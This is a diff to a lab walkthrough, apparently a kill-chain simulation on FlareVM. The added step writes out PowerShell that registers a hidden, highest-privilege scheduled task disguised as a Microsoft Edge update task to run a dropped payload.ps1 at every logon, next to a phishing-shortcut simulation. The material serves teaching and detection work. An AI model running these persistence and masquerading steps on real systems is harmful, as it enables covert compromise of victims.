@@ -91,6 +91,16 @@ $payloadContent | Out-File -FilePath $payloadPath -Encoding ASCII
 Get-Item $payloadPath
 ```
 
+Expected output:
+
+```powershell
+    Directory: C:\Users\acrkmr\AppData\Roaming\Microsoft\Windows
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        13/09/2026     20:07            521 payload.ps1
+```
+
 > **Why this path:** `AppData\Microsoft\Windows\` blends in with
 > legitimate Windows file structure. Real droppers land payloads here
 > specifically because it rarely gets scrutinised. This is what the
@@ -104,9 +114,6 @@ Get-Item $payloadPath
 
 The LNK file simulates the phishing lure - a shortcut that appears
 to be a document but silently executes the payload when opened.
-
-The filename is crafted to target a journalist or human rights
-activist. 
 
 On FlareVM, open PowerShell as Administrator:
 
@@ -136,5 +143,54 @@ Mode                 LastWriteTime         Length Name
 ```
 
 ![LNK Created](../screenshots/phase3-02-lnk-created.png)
+
+---
+
+## Step 4 - Establish Persistence
+
+The scheduled task ensures payload.ps1 runs automatically on
+every logon - even if the machine reboots or the initial process
+is killed.
+
+> **In a real attack this step does not require user interaction.**
+> A real implant creates its own scheduled task silently the moment
+> the user opens the phishing file. In this lab we run it manually
+> to document each stage of the kill chain separately.
+
+On FlareVM, open PowerShell as Administrator:
+
+```powershell
+$taskName = "MicrosoftEdgeUpdateTaskMachineCore"
+$taskAction = New-ScheduledTaskAction `
+    -Execute "powershell.exe" `
+    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\payload.ps1`""
+
+$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+
+Register-ScheduledTask `
+    -TaskName $taskName `
+    -Action $taskAction `
+    -Trigger $taskTrigger `
+    -RunLevel Highest `
+    -Force
+
+Get-ScheduledTask -TaskName $taskName | Select-Object TaskName, State
+```
+
+Expected output:
+
+```powershell
+TaskName                              State
+--------                              -----
+MicrosoftEdgeUpdateTaskMachineCore    Ready
+```
+
+> **Why this task name:** Attackers name persistence mechanisms
+> after legitimate Windows components. `MicrosoftEdgeUpdateTaskMachineCore`
+> already exists on most Windows machines as a real Edge update task -
+> a malicious copy blends in unless you diff against a known baseline.
+> This is exactly what the Autoruns baseline from Phase 2 catches.
+
+![Scheduled Task Created](../screenshots/phase3-03-scheduled-task.png)
 
 ---
